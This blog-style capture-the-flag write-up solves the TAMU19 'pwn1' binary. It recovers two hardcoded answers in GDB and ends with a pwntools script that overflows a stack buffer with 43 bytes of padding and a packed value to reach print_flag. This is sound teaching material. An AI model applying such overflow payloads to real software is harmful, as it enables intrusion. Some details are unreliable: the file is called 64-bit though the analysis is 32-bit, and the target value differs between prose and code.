---
title: Nightmare Series - Stack Smashing (Part 2)
categories:
  - Blog
tags:
  - Reversing
  - Exploits
published: true
---

## **File** 04-bof_variable/tmau19_pwn1

## **File Analysis**
File details confirm it is an 64 bit ELF file and symbols are available.

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/file_details.png)

Running the file presents us a basic prompt for input. Feeding with test data displays an error message and exits out. This gives us a clue that the binary expects a certain input answer.

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/basic_run.png)

## **Basic Reverse Engineering**
Using GDB we can see the following high level main function flow:
 - Basic function prologue
 - 2x function calls to 'puts' for initial prompts
 - Several resulting combinations of 'fgets' and 'puts' function calls for user input and further prompts
 - Several conditional jumps after each input is compared to saved value using 'strncmp' function
 - Final comparison to hardcoded value before calling 'print_flag' function
 - Epilogue and exit

From looking at the overall logic, we can see that several inputs are required to make it through various layers or answers before we can reach the 'call print_flag' instruction.

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/main_pt1.png)

## First Answer
Checking out the first chain of function calls, we see an 'fgets' followed by 'strncmp'. The value read in by 'fgets' is in this case stored in the location EBP-0x3b as is shown in the ```LEA EAX, [EBP-0x3b]; PUSH EAX;``` set of instructions (based on CDECL calling conventions) being the second parameter to the 'fgets' function call.

The following block of instructions sets up the variables for the function 'strncmp' which is comparing a saved string value to that which was passed in via the user. The value here is located at offset EBX-0x159f. We can place a quick breakpoint on the previous instruction and  when reached, print the string value contained at the offset giving us our first answer!

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/first_answer.png)

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/main_pt2.png)

## Second Answer
We're then greeted with a another prompt for an answer which we can see from the corresponding instruction blocks contains subsequent calls to 'fgets' again followed by 'strncmp', this time with a saved value at offset EBX-0x154d. Following the same routine as above we can print this value using GDB by placing a break point on the instruction just before and view the saved string value the binary expects. We now have our second answer!

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/second_answer.png)

At this point we have made it to the third question and this time the input is being compared directly with a hardcoded value of '0xdae110c8' thus controlling the conditional CMP/JNE instruction combination which allows us to reach the 'print_flag' function call or not.

The value is being compared directly with the offset EBP-0x10 on the stack. This is interesting because since if we look back, our previous input answer to this question is loaded (as all others were) at offset EBP-0x3b on the stack. This gives us a nice opportunity to again overflow the stack variable on our final answer, overwrite the location to ensure it contains the expected value and get our flag!

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/stack_diagram.png)

## **Exploit**

In this example, for the exploit to succeed we have to send all of the correct answers we have obtained in the appropriate order including the final exploit answer. The amount of padding data (0x3b-0x10 = 0x2b(43)bytes) required for our last answer followed by our overwrite payload value of '0xdae110c8' will be written to the stack. This should ensure the binary passes the conditional comparison and reaches the 'print_flag' function call instruction. We can receive the output, which contains our flag.

```
from pwn import *

pty = process.PTY
target = process('./pwn1',stdin=pty, stdout=pty)

#Setup responses
string1='Sir Lancelot of Camelot'
string2='To seek the Holy Grail.'
#Final exploit response to overwrite stack location with our controlled value
string3=b'A'*43+p32(0xdea110c8)

# Start the target process
#target = process('./pwn1')

#Recieve first output lines
print(target.recvline(timeout=5))
print(target.recvline(timeout=5))
#Send first answer
target.sendline(string1)

#Second output
print(target.recvline(timeout=5))
#Second answer
target.sendline(string2)

#Third output
print(target.recvline(timeout=5))
#Send third answer including exploit payload
target.sendline(string3)
print(target.recvall())
```

![](/assets/images/stacksmashing02_nightmare_04_tamu19_pwn1/exploit_run.png)
